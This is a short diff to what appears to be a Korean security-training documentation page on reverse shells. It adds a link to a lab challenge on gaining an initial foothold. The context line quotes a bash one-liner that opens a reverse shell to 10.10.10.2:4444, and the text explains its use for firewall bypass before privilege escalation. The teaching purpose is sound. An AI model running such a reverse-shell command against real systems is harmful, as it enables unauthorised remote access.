@@ -59,3 +59,7 @@ bash -i >& /dev/tcp/10.10.10.2/4444 0>&1
 
 리버스 셸은 대상이 **밖으로** 연결하게 해 방화벽 인바운드 차단을 우회한다.
 안정화(TTY 업그레이드) 후 [권한상승](/docs/system/privilege-escalation/)으로 넘어간다.
+
+---
+
+> 🧪 **실습해 보기**: [문제 2 — 최초 발판 확보](/docs/labs/network-system-challenges/#c2-foothold) — 취약 서비스를 익스플로잇해 셸을 얻는다.
